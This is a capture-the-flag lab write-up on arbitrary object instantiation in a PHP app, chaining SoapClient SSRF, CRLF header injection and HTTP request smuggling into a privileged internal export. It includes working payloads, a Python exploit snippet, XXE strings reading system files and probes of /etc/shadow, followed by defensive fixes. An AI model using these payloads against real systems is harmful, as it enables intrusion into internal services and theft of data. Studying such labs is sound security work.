# 02 — Arbitrary Object Instantiation — Writeup

## TL;DR

PluginHub does `new $plugin(...$args)` with a class name and a JSON argument
list from the query string, and ships no classes of its own. `SoapClient` is
the built-in class that pays: its constructor fetches the WSDL immediately
(SSRF) and its `user_agent` option is copied into the request header block
without any validation (CRLF injection). Injecting a bare `\r\n\r\n` closes the
header block early, so everything after it is parsed by the target as a second,
pipelined HTTP request — arbitrary method, arbitrary headers, arbitrary body.
That is enough to satisfy the internal registry's `POST /admin/export` +
`X-Registry-Role: admin` check and make it dump its vault bundle into the
package cache the front-end serves.

Flag: `PHRACK{soapclient_smuggled_me_into_the_registry}`

## The bug

### The vulnerable line

`challenge/src/index.php`:

```php
$plugin  = isset($_GET['plugin']) ? (string) $_GET['plugin'] : '';
$argsRaw = isset($_GET['args']) ? (string) $_GET['args'] : '[]';

if ($plugin !== '') {
    $args = json_decode($argsRaw, true);
    if (!is_array($args)) {
        $args = array();
    }

    try {
        $instance = new $plugin(...array_values($args));
        $loaderResult = 'initialised ' . get_class($instance);
    } catch (Throwable $e) {
        $loaderResult = get_class($e) . ': ' . $e->getMessage();
    }
}
```

This is the shape Orange Tsai opens section 1.1 with, and the shape of
CVE-2015-1033 in HumHub. The classic mitigation reflex — "there are no
dangerous classes in this app" — is not a mitigation: PHP itself provides
between 100 and 200 classes depending on build and extensions, and the
constructors of several of them do I/O.

Sharoglazov's PT SWARM article is the reference enumeration of that attack
surface. He also documents the practical constraint: with a single controlled
argument and no subsequent method calls, there is "almost nothing". Here we
control *all* arguments, which puts `SoapClient`'s two-argument constructor in
range.

### Enumerating the surface

The loader is its own enumeration tool. `new ArrayObject([])` works, so the
primitive is confirmed. Then it is a matter of walking the built-in classes:

```
/?plugin=ZipArchive&args=[]
    Error: Class 'ZipArchive' not found
/?plugin=Imagick&args=["x"]
    Error: Class 'Imagick' not found
/?plugin=SplFileObject&args=["/nope-xyz"]
    RuntimeException: SplFileObject::__construct(/nope-xyz): failed to open stream: No such file or directory
```

The extension list for this image (`php:7.4.33-apache` + `docker-php-ext-install
soap`) is:

```
Core date libxml openssl pcre sqlite3 zlib ctype curl dom fileinfo filter ftp
hash iconv json mbstring SPL PDO pdo_sqlite session posix readline Reflection
standard SimpleXML Phar tokenizer xml xmlreader xmlwriter mysqlnd soap sodium
```

No Imagick, no ZipArchive — so the MSL / curl-process tricks from the PT SWARM
article do not apply here. `soap` is the odd one out: it is not in the stock
image, and `challenge/Dockerfile` installs it on purpose.

### Why `SoapClient` is the one

Two properties, both of which you can check in the PHP source
(`ext/soap/php_soap.h`, `ext/soap/soap.c`, `ext/soap/php_http.c`):

1. **The constructor does network I/O.** `SoapClient::__construct($wsdl,
   $options)` with a non-`null` `$wsdl` immediately fetches and parses that
   URL. No method call is required, which is exactly what an
   object-instantiation primitive needs. Failure surfaces as a `SoapFault`, and
   PluginHub prints it:

   ```
   /?plugin=SoapClient&args=["http://registry:8080/",{"user_agent":"PluginHub/1.4"}]
       SoapFault: SOAP-ERROR: Parsing WSDL: Couldn't load from
       'http://registry:8080/' : Start tag expected, '<' not found
   ```

   The registry logs the hit. The request went out — the SSRF is real even
   though the object was never created.

2. **`user_agent` is unvalidated.** The option is pasted into the outgoing
   header block verbatim. Feeding it `"PluginHub/1.0\r\nX-Registry-Role:
   admin\r\nX-Probe: yes"` and pointing the WSDL at a raw socket listener
   produces:

   ```
   GET /admin/export?dest=loot HTTP/1.1
   Host: lis:8080
   User-Agent: PluginHub/1.0
   X-Registry-Role: admin
   X-Probe: yes
   Connection: close
   ```

   Injected headers land *before* `Connection: close`, i.e. inside the header
   block. (Same behaviour observed on 7.4.33 and on 8.2.33.)

That gets you "GET plus arbitrary headers". The registry wants a POST with a
body, so we need one more step.

### From header injection to request smuggling

`\r\n\r\n` in the `user_agent` terminates the header block of the WSDL request.
Everything after it is still written to the same socket, and a keep-alive
HTTP/1.1 server reads it as the next request on that connection:

```
GET / HTTP/1.1
Host: registry:8080
User-Agent: PluginHub/1.4
                                  <- injected blank line ends request #1
POST /admin/export HTTP/1.1       <- request #2, entirely ours
Host: registry:8080
X-Registry-Role: admin
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

dest=vault-1a2b3c4d.pkgConnection: close   <- leftovers of request #1's
                                              header block become a
                                              malformed request #3
```

Request #1 gets a 200 with the banner (unparseable as WSDL — hence the
`SoapFault`), request #2 is the privileged export, request #3 is garbage that
the server rejects after we are already done. The registry log confirms it:

```
[registry] 172.21.0.3 - "GET / HTTP/1.1" 200 -
[registry] 172.21.0.3 - "POST /admin/export HTTP/1.1" 200 -
```

The registry is a stock `http.server.BaseHTTPRequestHandler` with
`protocol_version = "HTTP/1.1"`, i.e. persistent connections — the ordinary
configuration of most HTTP servers. Nothing about it was bent to make the
smuggle work.

### Finishing a blind SSRF

The response to request #2 goes into PHP's SOAP HTTP client and is discarded;
`SoapClient` only ever reports *its own* failure. So the chain cannot end with
"read the response". It ends with a side effect:

`POST /admin/export` with `dest=vault-1a2b3c4d.pkg` writes the registry's vault
bundle into `/pkgcache/vault-1a2b3c4d.pkg`, and `/pkgcache` is a Docker volume
also mounted in the front-end at `/var/www/pkgcache`. PluginHub lists and prints
that directory via `?pkg=`:

```
GET /?pkg=vault-1a2b3c4d.pkg
PHRACK{soapclient_smuggled_me_into_the_registry}
```

The destination name is chosen fresh on every run (`solve.py` builds it from
four random bytes) and the cache is a persistent volume, so re-running the
exploit against a warm lab really does have to smuggle the request again
instead of re-reading what the previous run left behind.

This is the general pattern for blind SSRF: stop hunting for a response
channel, find the state change.

## Building the exploit

### Step 1 — confirm the primitive

```
/?plugin=ArrayObject&args=[[]]
    initialised ArrayObject
```

### Step 2 — reach the registry at all

```
/?plugin=SoapClient&args=["http://registry:8080/",{"user_agent":"PluginHub/1.4"}]
    SoapFault: SOAP-ERROR: Parsing WSDL: Couldn't load from 'http://registry:8080/' : Start tag expected, '<' not found
```

The error tells you two things: the host resolved, and it answered with
something that is not XML. (For a host that does not exist you get
`failed to load external entity` instead — a usable port/host scanner.)

Note the topology while you are here: `registry` sits alone with `challenge` on
a compose network declared `internal: true`, and the `solver` container is on
the other one. From the solver, `registry` does not even resolve
(`wget: bad address 'registry:8080'`), and its address on the internal subnet
is not routable either — so the SSRF is not a shortcut past a network you could
have reached anyway, it is the only way in.

### Step 3 — read `registry-api.txt`

The front-end ships the internal API doc. The administrative endpoint is:

```
POST /admin/export HTTP/1.1
Host: registry:8080
X-Registry-Role: admin
Content-Type: application/x-www-form-urlencoded

dest=<filename>
```

A plain WSDL GET cannot express any of that.

### Step 4 — smuggle it

```python
body = f"dest={dest}"          # dest = "vault-<4 random bytes>.pkg"
ua = (
    "PluginHub/1.4\r\n\r\n"
    "POST /admin/export HTTP/1.1\r\n"
    "Host: registry:8080\r\n"
    "X-Registry-Role: admin\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    f"Content-Length: {len(body)}\r\n"
    "\r\n"
    f"{body}"
)
```

JSON-encode it (`json.dumps` turns the CRLFs into `\r\n` escapes, which
`json_decode()` turns back into real bytes) and URL-encode the query:

```
/?plugin=SoapClient&args=%5B%22http%3A//registry%3A8080/%22%2C%7B%22user_agent%22%3A%22PluginHub/1.4%5Cr%5Cn%5Cr%5CnPOST%20/admin/export...
```

The page still shows the same `SoapFault` — that is request #1 failing, and it
is the only feedback you get.

### Step 5 — collect

```
/?pkg=vault-1a2b3c4d.pkg
```

## The exploit

`solve/solve.py`, Python 3 standard library only:

1. `load_plugin(base, "ArrayObject", [[]])` — sanity check that the loader
   instantiates arbitrary classes.
2. `load_plugin(base, "SoapClient", ["http://registry:8080/", {"user_agent":
   "PluginHub/1.4"}])` — proves the SSRF and prints the `SoapFault`.
3. `cached(base, DEST)` asserts the destination is **not** in the package
   cache yet — `DEST` is `vault-<4 random bytes>.pkg`, regenerated per run, and
   the cache volume survives `make down`-less re-runs. Without that assertion a
   second run (or a run whose smuggle silently broke) would still print a flag.
4. `smuggled_user_agent(DEST)` builds the CRLF-injected `user_agent` with a
   correctly sized `Content-Length`, and the same loader call fires it.
5. `fetch(base, {"pkg": DEST})` reads the exported bundle out of the shared
   package cache and regexes the flag out of the page.

Run it standalone with `python3 solve/solve.py http://127.0.0.1:8002`, or as
the compose service with `make solve`.

## Alternative primitives (all tested on this image)

Everything below was executed against the running lab, through the same
`?plugin=&args=` endpoint. Only behaviour that was actually observed is listed.

### `SimpleXMLElement` as an HTTP response reader — works

`new SimpleXMLElement($url, 0, true)` (third argument `data_is_url`) fetches the
URL and parses it. When the body is not XML, libxml's diagnostics include the
offending line — i.e. the response body — and PluginHub's error handler prints
them:

```
/?plugin=SimpleXMLElement&args=["http://registry:8080/",0,true]
    Exception: String could not be parsed as XML
    SimpleXMLElement::__construct(): http://registry:8080/:1: parser error : Start tag expected, '<' not found
    SimpleXMLElement::__construct(): PluginHub package registry 1.4
    SimpleXMLElement::__construct(): ^
```

That is a *readable* SSRF, and it is the easiest way to discover the registry
API without reading `registry-api.txt`. It cannot set headers or change the
method, so it cannot reach `/admin/export` on its own — it complements the
SoapClient chain rather than replacing it.

### `SimpleXMLElement` XXE — fires, but blind here

libxml on this image is 2.9.10, which disables external entities by default —
but the constructor's second argument is the libxml option mask, and passing
`LIBXML_NOENT|LIBXML_DTDLOAD` (`2|4 = 6`) re-enables them. Verified two ways:

- Out-of-band: an entity pointing at `http://registry:8080/xxe-entity-probe`
  shows up in the registry's log as `GET /xxe-entity-probe`.
- Locally: `<!ENTITY e SYSTEM "file:///etc/hostname">` substitutes cleanly and
  the object is constructed (`initialised SimpleXMLElement`).

PluginHub never prints the parsed document, so this is a blind primitive as
wired here. It does become an *error-based partial file read* when the included
file breaks XML parsing, because libxml echoes the offending line:

```
/?plugin=SimpleXMLElement&args=["<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY e SYSTEM \"file:///etc/apache2/apache2.conf\">]><r attr=\"&e;\"/>",6,false]
    SimpleXMLElement::__construct(): file:///etc/apache2/apache2.conf:64: namespace error : Failed to parse QName 'URL:http:'
    SimpleXMLElement::__construct(): # at <URL:http://httpd.apache.org/docs/2.4/mod/core.html#mutex>);
```

Note what that does *not* buy you: the flag is not on the front-end filesystem.

### `SplFileObject` — SSRF and filesystem oracle — works

```
/?plugin=SplFileObject&args=["http://registry:8080/spl"]
    RuntimeException: SplFileObject::__construct(http://registry:8080/spl): failed to open stream: HTTP request failed! HTTP/1.1 404 Not Found
/?plugin=SplFileObject&args=["/etc/shadow"]
    RuntimeException: SplFileObject::__construct(/etc/shadow): failed to open stream: Permission denied
/?plugin=SplFileObject&args=["/nope-xyz"]
    RuntimeException: SplFileObject::__construct(/nope-xyz): failed to open stream: No such file or directory
```

Blind GET-only SSRF that leaks the *status line*, plus a clean
exists / exists-but-unreadable / missing oracle for local paths. `SplFileObject`
is the primitive Sharoglazov lists first; on PHP < 8.0 it also reaches
`phar://`, which is where the SSRF-to-deserialization pivot lives (not usable
here: PluginHub has no gadget classes, which is the whole premise of the lab).

### `DirectoryIterator` / `GlobIterator` — directory oracle — works

```
/?plugin=DirectoryIterator&args=["/nope-xyz"]
    UnexpectedValueException: DirectoryIterator::__construct(/nope-xyz): failed to open dir: No such file or directory
/?plugin=GlobIterator&args=["/var/www/html/*"]
    initialised GlobIterator
```

Existence only — neither class prints its contents, because PluginHub never
iterates the object.

### `PDO` — arbitrary file creation — works

```
/?plugin=PDO&args=["sqlite:/var/www/html/created.db"]
    initialised PDO
```

`pdo_sqlite` is present, so the DSN creates the file. The content is a SQLite
header you do not control, so it is not a path to code execution on this image,
but it is a real write primitive.

### Not available here

`Imagick` and `ZipArchive` are both absent (`Class '...' not found`), so the
ImageMagick `msl:`/`https:/`-curl chain from the PT SWARM article — the most
powerful known `new $a($b)` escalation — cannot be reproduced on this build.
That is a property of the image, not a claim about the technique.

## Fixing it

**Never let a class name come from the request.** Map identifiers to classes
with an explicit allow-list:

```php
$registry = array(
    'thumbnailer' => \PluginHub\Plugin\Thumbnailer::class,
    'webhook'     => \PluginHub\Plugin\Webhook::class,
);

if (!isset($registry[$plugin])) {
    http_response_code(400);
    exit('unknown plugin');
}
$class = $registry[$plugin];
$instance = new $class($configFromDisk);   // arguments from config, not the URL
```

A `class_exists()` check, an `is_subclass_of()` check or a namespace prefix
filter are all weaker than they look: `SoapClient` passes `class_exists()`, and
`is_subclass_of()` still needs the class to be loaded (and on PHP < 8 the
default `spl_autoload_register()` can be a file-inclusion sink of its own).
Enumerate, do not validate.

**Do not let constructor arguments come from the request either.** Even a
perfectly filtered class name is dangerous if the caller can choose the
arguments — that is how a legitimate `SoapClient` plugin would become the same
SSRF.

**Defence in depth that would have broken the chain anyway:**

- Egress filtering on the front-end. PluginHub has no business opening
  arbitrary sockets; a deny-by-default policy that only permits
  `registry:8080` for the *legitimate* sync worker, not for the web process,
  removes the SSRF target.
- Real authentication on the internal service. "It is on a private network" is
  not an authorisation decision. A per-client credential — checked with
  `hash_equals()`-style constant-time comparison, not a boolean header —
  survives an SSRF; a trusted header does not.
- Reject malformed requests loudly. A server that refuses pipelined requests
  on a connection whose first request had an unusual header block, or that
  simply closes the connection after the first response, breaks the smuggle.
- `display_errors = Off` in production. PluginHub's diagnostics are what turn
  `SimpleXMLElement` into a readable SSRF.

## Going further

- Re-point the WSDL at a listener you control and dump the raw bytes PHP sends,
  for every SOAP option. `location`, `uri`, `login`, `password` and
  `proxy_host` are all worth a look.
- Do the same exercise on PHP 8.2: the `user_agent` injection still works
  there (verified), but the built-in class inventory differs.
- Add `ext-imagick` to the image and reproduce the `msl:` and `https:/`-curl
  techniques from the PT SWARM article end to end.
- Chapter 1.1 of the Phrack article escalates this exact primitive much
  further, combining it with PHP bug #71105 (a format-string in the "class not
  found" error message on PHP 7.0.0) to turn `new $model()` into memory
  corruption. `php:7.0.0-cli` is a pull away.
- The blind-SSRF half of this lab is the interesting half. Try finishing the
  chain *without* the shared package cache: what other observable state can
  `POST /admin/export` change?

## References

- Arseniy Sharoglazov (PT SWARM), *"Exploiting Arbitrary Object Instantiations
  in PHP without Custom Classes"* —
  <https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/>
- Midnight Blue, *"PHP Object Instantiation issues in HumHub
  (CVE-2015-1033)"* —
  <https://www.midnightblue.nl/blog/cve-2015-1033-humhub-php-object-instantiation-issues>
- Orange Tsai, *"The Art of PHP - My CTF Journey and Untold Stories!"*,
  Phrack #72 (2025), section 1.1 — <https://phrack.org/issues/72/5_md>
- PHP manual, `SoapClient::__construct()` and its options —
  <https://www.php.net/manual/en/soapclient.construct.php>
- PHP source, the SOAP HTTP client that writes the header block —
  <https://github.com/php/php-src/blob/PHP-7.4.33/ext/soap/php_http.c>
- PHP manual, `SimpleXMLElement::__construct()` (`data_is_url`, libxml option
  mask) — <https://www.php.net/manual/en/simplexmlelement.construct.php>
